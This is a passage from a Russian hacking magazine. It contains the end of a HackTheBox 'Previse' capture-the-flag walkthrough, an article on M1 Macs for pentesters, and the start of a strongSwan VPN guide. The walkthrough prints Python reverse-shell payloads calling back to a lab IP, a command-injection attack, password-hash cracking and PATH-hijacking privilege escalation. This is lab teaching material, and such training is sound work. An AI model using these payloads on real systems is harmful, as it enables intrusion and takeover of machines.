Таким образом мы можем просмотреть весь сайт.


ТОЧКА ВХОДА
Мы можем просматривать файлы сайта, но пока что способов продвинуться
дальше не видно. Попробуем получить больше информации о содержимом
каталогов при помощи перебора.

Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов с целью поиска скры‐
той информации и недоступных обычным посетителям функций. Для этого
можно использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске используем сле‐
дующие параметры:
 • -w — словарь (используем directory-list-2.3-medium из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из результата ответы с кодом 403.



Список популярных файлов на PHP можно найти в наборе словарей SecLists.
Запускаем перебор:


ffuf  -u http://previse.htb/FUZZ -w php_files_common.txt -t 200 -fc
403





                          Результат сканирования файлов

В выводе получаем много файлов, и некоторые выполняют редирект. А вот
неизвестный до этого файл nav.php возвращает код ответа 200. Взглянем
на него через браузер и обнаружим обычную навигацию по сайту.





                            Страница nav.php

Теперь обойдем все страницы через Burp Proxy и просмотрим ответы сер‐
вера. Чтобы удобно сделать это через браузер, будем перехватывать ответ
от сервера и менять код ответа с 302 (перенаправление) на 200 (успешный
ответ). Первым делом перехватываем запрос.





                          Перехват запроса в Burp Proxy

Теперь активируем перехват ответа. Для этого в контекстном меню выбираем
Do intercept → Response to this request. После этого отправляем запрос, нажав
на кнопку Forward. И сразу в этом же окне получим ответ.





                          Перехват ответа в Burp Proxy

Изменяем 302 Found на 200 OK.





                     Изменение ответа в Burp Proxy

Отправляем ответ, снова нажав на кнопку Forward. В браузере получаем нуж‐
ную нам страницу.





                          Страница accounts.php

Подобным образом взглянем и на остальные страницы.





                            Страница files.php





                          Страница file_logs.php

Мы нашли интересную возможность, но нам она пока недоступна. Зато мы
можем работать со страницей создания пользователя, чем и воспользуемся.





             Сообщение об успешном создании пользователя




                             Шапка сайта

Перейдем к странице files.php и скачаем бэкап сайта.





                     Содержимое скачанного архива

В архиве много файлов, о некоторых мы даже и не знали. Переходим к этапу
изучения исходного кода.


ТОЧКА ОПОРЫ
Среди файлов внутри архива обнаружим connect.php. Этот файл обычно
используется для указания настроек подключения к базе данных.





                     Содержимое файла connect.php

Но данный пароль никуда не подошел. Поэтому запоминаем на будущее
и продолжаем анализ. В файле file_logs.php видим, куда отправляется
запрос — файл logs.php.





                     Код формы запроса логов

А в файле logs.php находим место, где происходит обработка принимаемых
данных.





                       Содержимое файла logs.php

Никакая фильтрация не используется, при этом значение параметра просто
передается в команду консоли. Она будет выполнена в функции exec. Так мы
можем завершить одну команду точкой с запятой и затем выполнить другую.
   Откроем листенер командой rlwrap  nc  -lvp  80 и передадим сле‐
дующую нагрузку, которая даст нам реверс‑шелл. После вставки нагрузки
выделяем ее и нажимаем Ctrl-U в Burp. Это легкий способ закодировать
передаваемый параметр в кодировке URL.


python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect(("10.10.14.134",80
));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.
fileno(),stderr=s.fileno())'



                           Исходный запрос





                           Измененный запрос





                           Полученный бэкконнект

В итоге в окне листенера получим удаленную командную оболочку.


ПРОДВИЖЕНИЕ
Так как на хосте развернут веб‑сервер, а на нем работает даже целое
веб‑приложение,  то  первое наше  действие —  попробовать  получить
какие‑либо учетные данные пользователей. Высока вероятность, что эти учет‐
ные данные подойдут и для локальных пользователей тоже. Обычно такие
критические данные хранятся либо в конфигах, либо в базе данных.
   Так у нас уже есть необходимые параметры для подключения к базе дан‐
ных, давай посмотрим, что она содержит. Первым делом запустим TTY-обо‐
лочку, чтобы нормально взаимодействовать с потоками ввода/вывода.


python3 -c 'import pty; pty.spawn("/bin/bash")'

А теперь подключимся к MySQL и запросим список баз данных.


mysql -u root -D previse -p
show databases;





                            Список баз данных

Из представленных баз по названию определяем пользовательскую. Выбира‐
ем ее и получаем список таблиц.


use previse;
show tables;





                       Список таблиц в базе previse

Таблица accounts может содержать учетные данные для сайта. Получим все
записи из таблицы.


select * from accounts;





                      Содержимое таблицы accounts

Вот мы и нашли учетные данные пользователей. Сначала меня смутил вид
хешей, но hashcat все равно их перебрал. Сначала определим нужный режим
(mode) перебора по типу хеша, а потом выполним перебор по словарю.


hashcat --example | grep '\$1\$' -A2 -B2





                       Определение режима hashcat


hashcat -a 0 -m 500 hashes ../tools/rockyou.txt





                        Нахождение прообраза хеша

С найденным паролем подключаемся по SSH и забираем первый флаг.



                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Теперь вряд ли получится просто где‑то найти учетные данные. Поэтому нуж‐
но использовать какой‑то способ повышения привилегий. Для поиска этого
способа можно, конечно, запустить специальные скрипты вроде LinPEAS,
но можно сразу проверить наиболее вероятные места: настройки sudoers,
приложения с выставленным битом SUID, прослушиваемые на localhost порты
и так далее.
   Пишем sudo -l, чтобы проверить sudoers.




                              Настройки судоера


Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.



Мы можем выполнить скрипт /opt/scripts/access_backup.sh от имени
пользователя root. Просмотрим содержимое файла.





                  Содержимое файла access_backup.sh

Даже не стоит разбираться в том, что делает этот скрипт, так как уязвимость
видна сразу. Путь к исполняемому файлу gzip указан не абсолютный (пол‐
ный), поэтому операционная система будет искать этот файл во всех катало‐
гах, указанных в переменной окружения PATH. Мы можем создать свой скрипт
с названием gzip и внести его каталог первым в переменную PATH.
  В скрипте запишем уже использованный ранее реверс‑шелл.


#!/bin/bash
python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect(("10.10.14.134",8080));subprocess.
call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.
fileno())'




                    Файл с реверс‑шеллом

Затем вносим каталог /tmp в переменную PATH.


export PATH= /tmp:$PATH



                     Проверка значения переменной PATH

Открываем листенер (команда rlwrap nc -lvp 8080) и запускаем через
sudo скрипт /opt/scripts/access_backup.sh. Таким образом запущенный
из  скрипта  в  высокопривилегированном   контексте  gzip  даст  нам
реверс‑шелл.





                           Флаг рута

Машина захвачена, мы имеем над ней полный контроль!
ТРЮКИ
 M1
  ДЛЯ ХАКЕРА





                                            Denis Simonov
                                            Пентестер и дизайнер.
                                        Занимаюсь проблемами
                                         моделирования времени в
                                              виртуальных мирах.
                                           me@n0a.pw


        ТЕСТИРУЕМ HOMEBREW,
      ВИРТУАЛКИ, DOCKER И NODE
     НА НОВОЙ АРХИТЕКТУРЕ APPLE





В 2020 году Apple представила новую архитектуру Apple
Silicon на базе ARM и объявила, что в течение двух лет
переведет на нее все свои компьютеры. Для простых поль‐
зователей миграция проходит практически незаметно, а как
насчет продвинутых? В этой статье я расскажу об итогах
года использования MacBook Pro с M1 внутри и покажу те
немногие подводные камни, с которыми мне довелось стол‐
кнуться.


ВНЕШНИЙ МОНИТОР
Макбуки из первого поколения компьютеров на M1 поддерживали всего один
внешний монитор (к Mac mini можно подключить два). С выходом новых
MacBook Pro на M1 Pro и M1 Max ситуация изменилась: у них есть порт HDMI,
который можно использовать для второго экрана.
   Если же менять ноутбук ты пока не хочешь, а для работы нужно несколько
мониторов,  то  решением  может  стать  док‑станция  с  поддержкой
DisplayLink — например, Dell D6000 или CalDigit. Однако я просто отказался
от использования трех мониторов и купил один, но UltraWide. Да, это не Retina
Display, но если тебе нужно разрешение 5K, то выбор невелик — только LG
UltraFine, стоящие 90 с чем‑то тысяч рублей.
   Недавно товарищ посоветовал мне великолепную утилиту, которая поз‐
воляет в разы улучшить работу с моим монитором. BetterDummy создает
фиктивный дисплей, который поддерживает огромный набор разрешений
Retina, а затем передает картинку с него на твой. Если твой монитор плохо
поддерживается в macOS, то эта программа может кардинально изменить
ситуацию.
   Например, для дисплея с разрешением 3440 × 1440 я рекомендую
использовать следующие настройки.





Единственная  проблема,  с  которой  я  столкнулся  при  использовании
BetterDummy, —  невозможно  выставить  высокую  частоту  обновления
(144 Гц). Оказалось, что это ограничение API CGVirtualDisplay в macOS,
и исправить эту проблему может только Apple. Возможно, все изменится, ког‐
да появится поддержка ProMotion для AirPlay или Sidecar.
   Если ты хочешь иметь высокую частоту обновления экрана (144 Гц и выше)
с разрешением 3440 на 1440 точек и более, то  придется  отказаться
от BetterDummy и купить отдельный кабель USB Type-C → DisplayPort. Через
универсальные хабы (у меня Native Union) работать с такими настройками
не выйдет — не хватит пропускной способности порта для одновременного
вывода изображения и подключения периферии.


HOMEBREW И ZSH
Homebrew — популярный сторонний пакетный менеджер для macOS. Если
тебе нужна какая‑то консольная утилита, то, скорее всего, ты найдешь ее
в Homebrew. С версии 3.0 Homebrew поддерживает ARM. До этого рабочим
решением была  установка Homebrew через слой бинарной  трансляции
Rosetta 2. Соответственно, все приложения, установленные оттуда, тоже про‐
ходили трансляцию и работали (но не так быстро, как могли бы армовские
бинарники).
   Сейчас  достаточно  поставить  Homebrew  через  скрипт‑установщик
и получать нативные пакеты для ARM.


$ xcode-select --install
$ /bin/bash -c "$( curl -fsSL https://raw.githubusercontent.com/
Homebrew/install/HEAD/install.sh)"
$ echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> /Users/$(
logname)/.zprofile
$ eval "$(/opt/homebrew/bin/brew shellenv)"

Но если понадобится переключаться между архитектурами, то можешь сде‐
лать себе такие алиасы в файле ~/.bashrc или ~/.zshrc:


alias intel="env /usr/bin/arch -x86_64 /bin/zsh --login"
alias arm="env /usr/bin/arch -arm64 /bin/zsh --login"

Чуть позже мы столкнемся с практическим применением такого решения,
но если вкратце, то скрипт конфигурации (./configure) перед сборкой опре‐
деляет переменные системы, в том числе и для какой архитектуры ком‐
пилировать проект. Например, если сейчас выбрать режим i386 при установ‐
ке Homebrew,  то  вместо  бинарников для ARM64 мы получим  версии
для x86_64, что приведет к потере производительности.


ВИРТУАЛЬНЫЕ МАШИНЫ
Parallels Desktop
Продукт Parallels — это в данный момент самое функциональное решение
для виртуализации на M1. Недаром его показывали на презентации Apple.
Через Parallels Desktop можно в один клик установить дистрибутивы Ubuntu,
Fedora, Debian и macOS Monterey. С версии 17.1.1 добавлена поддержка
актуальной на данной момент версии Kali Linux — 2021.3.
   Драйверы гостевых машин оптимизированы и работают без нареканий
(буфер обмена, сеть, динамическое разрешение, 3D-ускорение и прочие
фичи). Проброс адаптера Wi-Fi или любого другого устройства работает кор‐
ректно.
   Отдельно хочется поговорить о Windows 11 для ARM, которая умеет тран‐
слировать код приложений x86_64 в нативные вызовы ARM. Причем делает
это весьма качественно, как и Rosetta 2. При помощи такой матрешки мне
удалось запустить отладчик для кода x64 и без проблем увидеть регистры
RBX, RSP, RBP и так далее.
   Так же работает и Visual Studio, которая смогла скомпилировать неболь‐
шой тестовый проект (Quasar RAT) в классическую архитектуру i386. И это все
на виртуальной машине с гостевой Windows, для которой хостом выступает
macOS для ARM. Фантастика!





Не могу не отметить энергоэффективность при работе с виртуальными
машинами. Запущенные фоном VM без серьезной нагрузки практически
не влияют на время работы от аккумулятора. Помимо этого, в новых версиях
Parallels был добавлен режим поездки, в котором еще сильнее снижается
энергопотребление при бездействии VM.


VMware
Еще один производитель популярных решений для виртуализации до недав‐
него времени был за бортом затеянного Apple переворота, но в конце сен‐
тября 2021 года компания VMware представила на всеобщее обозрение тех‐
ническое превью VMware Fusion.





Сейчас VMware Fusion можно бесплатно загрузить на странице продукта
или же по прямой ссылке. Минимальный набор удобств присутствует, однако
в Ubuntu мне не удалось настроить VMware Tools. Я установил открытую вер‐
сию — open-vm-tools, но и это не помогло мне сделать адаптивное раз‐
решение экрана и общий с хостовой системой буфер обмена.
  В общем, решение сыроватое, но вполне работоспособное и пока что
бесплатное.


QEMU
QEMU — это глыба не только среди продуктов эмуляции, но и среди средств
аппаратной виртуализации. Это основа гипервизора KVM, который исполь‐
зует аппаратные возможности современных процессоров. Базовая поддер‐
жка Apple Silicon уже есть в QEMU, и ее активно дорабатывают. Так что его
в ряде случаев можно использовать как мощное средство виртуализации
на M1.


Установка QEMU
Для начала подготовим необходимые пакеты для сборки:


$ brew install libffi gettext glib pkg-config autoconf automake
pixman ninja

Клонируем репозиторий QEMU, добавляем ветку со включенным расширени‐
ем BFloat16 и применяем патч Александра Графа:


$ git clone https://github.com/qemu/qemu && cd qemu
$ git checkout 3c93dfa42c394fdd55684f2fbf24cf2f39b97d47
$ curl https://patchwork.kernel.org/series/485309/mbox/ | git am

Собираем и устанавливаем QEMU:


$ mkdir build && cd build
$ ../configure --target-list=aarch64-softmmu
$ make -j8
$ sudo make install

Готово, можно пользоваться!


Создание виртуальной машины с Ubuntu в QEMU
Давай попробуем поставить Ubuntu для x86_64.
   Перед установкой нужно подготовить диск:


$ curl https://cdimage.ubuntu.com/releases/20.04/release/ubuntu-20.
04.3-live-server-arm64.iso -o ubuntu-20.0.4.iso
$ qemu-img create -f qcow2 virtual-disk.qcow2 8G


$ cp $(dirname $(which qemu-img))/../share/qemu/edk2-aarch64-code.fd
.


$ dd if=/dev/zero conv=sync bs= 1m count= 64 of=ovmf_vars.fd


$ qemu-system-aarch64 \
  -machine virt,accel=hvf,highmem= off \
  -cpu cortex-a72 -smp 4 -m 4G \
  -device virtio-gpu-pci \
  -device virtio-keyboard-pci \
  -drive "format=raw,file=edk2-aarch64-code.fd,if=pflash,readonly=on"
\
  -drive "format=raw,file=ovmf_vars.fd,if=pflash" \
  -drive "format=qcow2,file=virtual-disk.qcow2" \
  -cdrom ubuntu-20.0.4.iso

После этой команды должна запуститься установка Ubuntu. По завершении
запускаем виртуальную машину:


$ qemu-system-aarch64 \
  -machine virt,accel=hvf,highmem= off \
  -cpu cortex-a72 -smp 4 -m 4G \
  -device virtio-gpu-pci \
  -device virtio-keyboard-pci \
  -drive "format=raw,file=edk2-aarch64-code.fd,if=pflash,readonly=on"
\
  -drive "format=raw,file=ovmf_vars.fd,if=pflash" \
  -drive "format=qcow2,file=virtual-disk.qcow2" \
  -nic hostfwd=tcp:127.0.0.1:4422-0.0.0.0:22 &

Для коннекта по SSH:


$ ssh <username>@127.0.0.1 -p 4422

Для Windows все аналогично, отличия в оборудовании, формате образа дис‐
ка и еще всякое по мелочи. Единственный минус прямой работы с QEMU —
все придется делать руками. С другой стороны, это добавляет гибкости.
Однако можно и избежать лишнего труда, если использовать утилиту UTM.


        WWW

                   •How to run Windows 10 on ARM or Ubuntu for
                    ARM64 in QEMU on Apple Silicon Mac
                   •3D accelerated qemu on MacOS
                       •Running Linux and Windows on M1 with QEMU
                       •Apple Silicon M1 QEMU



UTM
QEMU — мощная штука и в умелых руках может творить чудеса. Однако
не всегда удобно разбираться в пятиэтажных аргументах конфигурации, осо‐
бенно если нужно что‑то быстро изменить или добавить.
  UTM — это графическая оболочка, которая значительно упрощает работу
с QEMU в macOS. У проекта есть официальный сайт и репозиторий на GitHub.
Отдельно стоит отметить галерею готовых образов для быстрой раскатки.
Среди ожидаемых систем можно найти ReactOS (x86), Sun Solaris (SPARC),
Mac OS 9.2.1 (PPC) и старушку Windows XP (x64). Конечно, эти ребята в эму‐
ляции будут работать не так быстро, как гостевые системы с поддержкой
ARM, зато как зрелищно!





Я практически не использую это решение, поскольку работать с софтом
в гостевой ОС все же неудобно, да и стабильность не блещет. Но бывают
случаи, когда эта штука может выручить.
    Существует, кстати, и версия UTM для iOS, но установить ее можно только
через сайдлоадинг.


VirtualBox (спойлер: его нет)
Увы, разработчики этого популярного опенсорсного решения для виртуали‐
зации пока что не добрались до M1. А это значит, что нельзя запустить и вир‐
туалки с Android вроде Genymotion, NoxPlayer и BlueStacks. Так что пока при‐
ходится довольствоваться Android Developer Studio.


Metasploitable3
Когда я попытался использовать эту виртуальную машину для тестирования
эксплоитов, то  столкнулся с проблемой. Запустить ее получилось лишь
в QEMU, но работать с комфортом это не позволяет — производительность
выходит слишком низкая.
  К тому же в macOS Big Sur и Monterey QEMU не может использовать проб‐
рос портов через NAT из‑за отсутствия TAP-устройств (виртуальные сетевые
драйверы  ядра  системы  для  эмуляции  Ethernet).  Единственная  воз‐
можность — переадресация локального порта на виртуальную машину, как
в примере с установкой Ubuntu Server выше и SSH-доступом к ней.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИТРЮКИ
     M1        ДЛЯ ХАКЕРА
         ТЕСТИРУЕМ HOMEBREW, ВИРТУАЛКИ, DOCKER
             И NODE НА НОВОЙ АРХИТЕКТУРЕ APPLE





DOCKER И NODE.JS
Сейчас с Docker сложностей практически нет. Приложение давно нативное,
установка — стандартная.
   Единственный нюанс, о котором хочется рассказать, — это отсутствие
в Docker Hub версий некоторых образов для ARM. А еще бывает, что образ
есть, но в нем несовместимые библиотеки, которые нужно перекомпилиро‐
вать. Если в первом случае все очевидно, то о второй проблеме я бы хотел
поговорить подробнее.
   Например, в своем проекте я столкнулся с тем, что невозможно собрать
модуль sharp@0.28.3 для Node.js в базовом образе Node из Docker Hub.


             INFO

                       Sharp — это высокоскоростной модуль Node.js
                       для преобразования больших изображений рас‐
                          пространенных  форматов  (JPEG,  PNG,  AVIF
                      и WebP) в более мелкие.


В этом популярном образе были проблемы с зависимостями. Как оказалось,
столкнулся с ними не я один.
   Суть проблемы в том, что в образе Docker для сборки зависимостей
пакета sharp необходима библиотека  libvips версии 8.10.6 или старше,
которая идет с glibc 2.29+. В своем файле сборки я использовал образ
node:16.3-buster-slim с  glibc 2.24. Понадобилось вручную собирать под‐
ходящую версию libvips.
  Мой Dockerfile:


FROM node:16.3-buster-slim
WORKDIR /opt/app
ADD . .
RUN npm install
RUN npm run build api
CMD ["node", "./dist/apps/api/main.js"]

Лог установки Sharp на node:16.3-buster-slim:


#8 21.23 sharp: Installation error: Use with glibc 2.24 requires
manual installation of libvips >= 8.10.6
#8 21.23 sharp: Please see https://sharp.pixelplumbing.com/install
for required dependencies
#8 21.47 npm WARN The package typescript is included as both a dev
and production dependency.
#8 21.48 npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@2.
3.2 (node_modules/fsevents):
#8 21.48 npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported
platform for fsevents@2.3.2: wanted {"os":"darwin","arch":"any"} (
current: {"os":"linux","arch":"arm64"})
#8 21.48
#8 21.51 npm ERR! code ELIFECYCLE
#8 21.51 npm ERR! errno 1
#8 21.51 npm ERR! sharp@0.28.3 install: `(node install/libvips &&
node install/dll-copy && prebuild-install) || (node install/
can-compile && node-gyp rebuild && node install/dll-copy)`
#8 21.51 npm ERR! Exit status 1

В такой ситуации нужно или пересобирать libvips для ARM64, или же исполь‐
зовать более свежий образ операционной системы. Например, можно взять
node:14-alpine, который уже содержит скомпилированные для ARM бинарники
и занимает на 700 Мбайт меньше, чем Debian.
  Я выбрал хардкорный вариант пересборки библиотеки libvips под ARM64.
Добавил несколько строк в Dockerfile:


FROM node:16.3-buster-slim
RUN apt-get update -qq && apt -y upgrade && \
    apt-get install -y git build-essential libpng-dev wget pkg-
config glib2.0-dev libexpat1-dev autoconf nasm libtool dpkg g++
RUN wget https://github.com/libvips/libvips/releases/download/v8.12.
1/vips-8.12.1.tar.gz
RUN tar xf vips-8.12.1.tar.gz && cd vips-8.12.1 && ./configure &&
make && make install && ldconfig
WORKDIR /opt/app
ADD . .
RUN npm install
RUN npm run build api
CMD ["node", "./dist/apps/api/main.js"]

И собираю без ошибок.


docker build -t test -f apps/api/Dockerfile .

В общем, когда работаешь на менее популярной архитектуре, это может вре‐
мя от времени приводить к проблемам вроде той, что я описал. Но зато
теперь ты знаешь, что делать в таких случаях!


ПРОКСИРОВАНИЕ ТРАФИКА ПРИЛОЖЕНИЙ MACOS
Для перехвата и анализа трафика есть отличная утилита mitmproxy, а в паре
с ProxyChains-ng они способны замитмить практически любое приложение
macOS, которое использует HTTP.
  В начале статьи мы делали быстрые алиасы для переключения архитектур,
теперь самое время их применить. К слову, поддержку macOS Monterey
и M1  в  ProxyChains-ng  добавили  совсем  недавно —  в начале  янва‐
ря 2022 года.
  Мы соберем две разные версии библиотек libproxychains4.dylib для работы
с обеими архитектурами. Большинство программ универсальны и ском‐
пилированы для двух архитектур сразу (Mach-O universal binary). Например:


$ file /usr/bin/python
/usr/bin/python: Mach-O universal binary with 2 architectures: [x86_
64:Mach-O 64-bit executable x86_64] [arm64e:Mach-O 64-bit executable
arm64e]
/usr/bin/python (for architecture x86_64):  Mach-O 64-bit executable
x86_64
/usr/bin/python (for architecture arm64e):  Mach-O 64-bit executable
arm64e

Версии для x86_64 и для ARM предназначены для работы с приложениями,
собранными под соответствующие архитектуры. Начнем с x86_64.


$ intel
$ arch
i386
$ git clone https://github.com/rofl0r/proxychains-ng
$ cd proxychains-ng
$ ./configure
$ make && make install

Пробуем, например с TOR:


$ proxychains4 curl icanhazip.org


[proxychains] config file found: /usr/local/etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains4.dylib
[proxychains] DLL init: proxychains-ng 4.15-git-8-g2739fb5
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  icanhazip.org:
80  ...  OK
45.153.160.135

Отлично  работает для  утилиты  curl. Давай  попробуем  сделать  прокси
для Telegram. Он как раз написан только под ARM, и нам потребуется
пересобрать proxychains4.
   Удостоверимся, что это приложение для ARM:


$ file /Applications/Telegram.app/Contents/MacOS/Telegram
/Applications/Telegram.app/Contents/MacOS/Telegram: Mach-O 64-bit
executable arm64

Все так, теперь меняем архитектуру:


$ arm
$ arch
arm64

Пересоберем ProxyChains-ng:


$ make clean
$ ./configure
$ make

Здесь я намеренно не делал make inastall, так как затрется предыдущая
версия. Буду запускать из папки proxychains-ng. После сборки бинарник
и библиотека лежит в корне. Подкорректирую конфиг:


$ cp src/proxychains.conf ./
$ sed -i '' 's/socks4/#socks4/g' proxychains.conf
$ echo "http 127.0.0.1 8080" >> proxychains.conf

Теперь установим mitmproxy:


$ brew install mitmproxy

Проверим работу:


$ mitmproxy

Установим необходимые сертификаты:


$ sudo security add-trusted-cert -d -p ssl -p basic -k /Library/
Keychains/System.keychain ~/.mitmproxy/mitmproxy-ca-cert.pem

В одной вкладке терминала запускаем mitmproxy, в другой — Telegram через
proxychains:


$ ./proxychains4 /Applications/Telegram.app/Contents/MacOS/Telegram

Конечно, помимо «Телеграма», мы можем перехватывать, например, целый
Firefox и смотреть, куда летят запросы самого браузера или его расширений:


$ proxychains4 /Applications/Firefox.app/Contents/MacOS/firefox





Таким образом мы можем захватывать трафик практически любых приложе‐
ний для macOS. К слову, для анализа трафика на интерфейсе всегда можно
использовать Wireshark, который с версии 3.6.0 стал нативным приложением
для архитектуры ARM.


        WWW

                          •Tracing    all  network  machine   traffic  using
                          mitmproxy for macOS
                           •Intercepting Network Traffic with mitmproxy
                         •Monitoring HTTPS Traffic of a Single App on OSX



WI-FI И ЗАХВАТ ПАКЕТОВ
Стандартный адаптер  Wi-Fi, который  ставят в  макбуки, вполне неплохо
работает в режиме мониторинга и позволяет захватывать пакеты на опре‐
деленном канале. Продемонстрирую это на практике:


$ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/
Versions/Current/Resources/airport /usr/local/bin/airport
$ airport -s      # Смотрим сети
$ sudo airport -z # Отключаемся от активных сетей
$ airport <interface> sniff <channel>
$ ls /tmp/airportSniff* .cap

Однако со встроенным адаптером не выйдет использовать Wifite2 и прочие
подобные утилиты для Linux, так как aircrack-ng на M1 пока что собрать нель‐
зя. Если без них тебе не обойтись, придется использовать внешний адаптер
и виртуальную машину.


        WWW

                           Дополнительную информацию о работе с Wi-Fi
                            стандартными методами macOS можешь узнать
                       из отличного материала Павла Жовнера.



ПРОГРАММЫ ДЛЯ IOS
Напоследок — еще одно занятное отличие от машин с  Intel. На «маках»
с M1 возможен запуск приложений, разработанных для iOS, для этого дос‐
таточно зайти в App Store и выбрать соответствующую вкладку. Это удобно.
Например, у меня дома есть несколько умных розеток, но, кроме мобильного
приложения, способа управлять ими нет. По умолчанию все приложения
для iOS доступны на «маках» с M1, но разработчики могут при желании зап‐
ретить использование на десктопе.


        WWW

                         •Reverse-engineering Rosetta 2
                         •Fuzzing iOS code on macOS at native speed
                   •How  to  install ANY  iPhone App  (Even Non-
                           Appstore) on M1 Macs
                          •Is Apple Silicon ready



ВЫВОДЫ
Могу с уверенностью сказать, что это один из лучших ноутбуков для работы.
Использую его как замену десктопа с док‑станцией и внешним монитором
(к сожалению, одним, но большим и широким). Прекрасная энергоэффектив‐
ность и рекордная мощность обеспечены лучшим на сегодняшний день тех‐
процессом и архитектурой, где память расположена вплотную к процессору.
Удобная и безопасная ОС довершает картину.
    Бояться ARM не нужно. Приложения для Intel великолепно запускаются
через Rosetta 2, виртуализация отлично работает практически без потери
производительности, и даже Windows 11 ARM сможет транслировать при‐
ложения x86_x64 в код для ARM. Все твои приложения внутри Windows будут
работать, вплоть до дебаггеров и Visual Studio с компиляцией проектов
в x86_64.
   Да, проблемы еще встречаются, но они решаемы, и разработчики активно
трудятся над тем, чтобы через год‑другой о совместимости можно было
не думать вовсе. Прошедший год показывает, что это вполне реально.
   Подводя итог: Apple Silicon — это рабочее решение, которое я даже
не думаю менять на что‑то другое. А на самый крайний случай всегда есть
удаленный сервер с классической архитектурой.
ТРЮКИ
СИЛЬНЫЙ
ЛЕБЕДЬ

ДЕЛАЕМ VPN НА STRONGSWAN
И АВТОМАТИЗИРУЕМ ПОДКЛЮЧЕНИЕ В IOS





  Андрей Письменный
     Главный редактор
   apismenny@gmail.com





Недавно я обнаружил, что на iPhone можно сделать так, что‐
бы VPN автоматически включался и выключался в опре‐
деленных условиях. Хорошенько раскурив документацию, я
накатал конфиг, и теперь VPN у меня на телефоне работает
при подключении к мобильной сети или гостевому Wi-Fi,
а дома отключается. В этой статье я покажу, как сделать неч‐
то подобное. Однако сначала нам понадобится сам сервер
VPN — в качестве него мы установим strongSwan.


Такой выбор обусловлен тем, что ни OpenVPN, ни WireGuard не поддержи‐
ваются в iOS без программы‑клиента. Нам же для того, чтобы покопаться
в правилах подключения, нужно будет загрузить на устройство кастомный
профиль VPN, а это возможно, только если мы подключаемся системными
средствами. Протокол IKEv2/IPSec, реализованный в strongSwan, как раз под‐
держивается на уровне системы. Причем не только в iOS — точно так же
без всякого клиента к нему можно подключаться из Windows и Linux.
   Ответ на вопрос, зачем тебе свой VPN, ты, думаю, уже знаешь. Например,
через него часто настраивают подключение к приватной инфраструктуре
или получают доступ к ресурсам, до которых трафик по тем или иным при‐
чинам не доходит напрямую. Да что там, может, тебе просто иногда любопыт‐
но, как выглядит главная страница Pornhub в стране, где ты только что арен‐
довал недорогой VPS!


СТАВИМ И НАСТРАИВАЕМ STRONGSWAN НА СЕРВЕРЕ
Начнем мы с развертывания strongSwan на частном сервере. Ниже я приведу
краткий пересказ мануала по его настройке, предполагая, что у тебя установ‐
лена Ubuntu 20.04. Если у тебя другой Linux, команды могут отличаться,
но принцип и конфиги будут по большей части те же.
   Первый шаг стандартный для установки чего угодно:


sudo apt update

Теперь ставим нужные пакеты:


sudo apt install strongswan strongswan-pki \
  libcharon-extra-plugins libcharon-extauth-plugins \
  libstrongswan-extra-plugins libtss2-tcti-tabrmd-dev

Когда все скачается, перейдем к настройке.


Генерируем сертификаты
Создаем каталоги для сертификатов и ключей:


mkdir -p ~/pki/{cacerts,certs,private}

Убираем у этой папки лишние права — для надежности:


chmod 700 ~/pki

Генерируем корневой ключ RSA:


pki --gen --type rsa --size 4096 --outform pem \
  > ~/pki/private/ca-key.pem

И корневой сертификат:


pki --self --ca --lifetime 3650 --in ~/pki/private/ca-key.pem \
  --type rsa --dn "CN=VPN root CA" --outform pem \
  > ~/pki/cacerts/ca-cert.pem

Число 3650 — это десять лет (в днях), которые будет работать сертификат.
Можешь изменить это значение на свое усмотрение.
   Корневые сертификаты готовы, теперь нам нужен сертификат для нашего
сервера.
   Делаем приватный ключ:


pki --gen --type rsa --size 4096 --outform pem \
  > ~/pki/private/server-key.pem

И сам сертификат. Обрати внимание, что IP в трех местах нужно изменить
на IP твоего сервака.


pki --pub --in ~/pki/private/server-key.pem --type rsa \
  | pki --issue --lifetime 1825 --cacert ~/pki/cacerts/ca-cert.pem \
  --cakey ~/pki/private/ca-key.pem --dn "CN=NNN.NNN.NNN.NNN" \
  --san @NNN.NNN.NNN.NNN --san NNN.NNN.NNN.NNN \
  --flag serverAuth --flag ikeIntermediate --outform pem \
  > ~/pki/certs/server-cert.pem

С этим закончили, можем перемещать ключи и сертификаты из домашнего
каталога в папку настроек strongSwan:


sudo cp -r ~/pki/* /etc/ipsec.d/


Настраиваем strongSwan
На всякий случай переименуем старый файл с настройками, если он есть:


sudo mv /etc/ipsec.conf{,.original}

Откроем его /etc/ipsec.conf в nano:


sudo nano /etc/ipsec.conf

Добавляем раздел config setup:


config setup
  charondebug="ike 1, knl 1, cfg 0"
  uniqueids =no

Дальше добавляем настройки туннеля IKEv2 (не забудь подставить свой IP):


conn ikev2-vpn
  auto=add
  compress=no
  type=tunnel
  keyexchange=ikev2
  fragmentation=yes
  forceencaps=yes
  dpdaction=clear
  dpddelay=300s
  rekey=no
  left=%any
  leftid=NNN.NNN.NNN.NNN
  leftcert=server-cert.pem
  leftsendcert=always
  leftsubnet=0.0.0.0/0
  right=%any
  rightid=%any
  rightauth=eap-mschapv2
  rightsourceip=10.10.10.0/24
  rightdns=8.8.8.8,8.8.4.4
  rightsendcert=never
  eap_identity=%identity
  ike=chacha20poly1305-sha512-curve25519-prfsha512,
aes256gcm16-sha384-prfsha384-ecp384,aes256-sha1-modp1024,
aes128-sha1-modp1024,3des-sha1-modp1024!
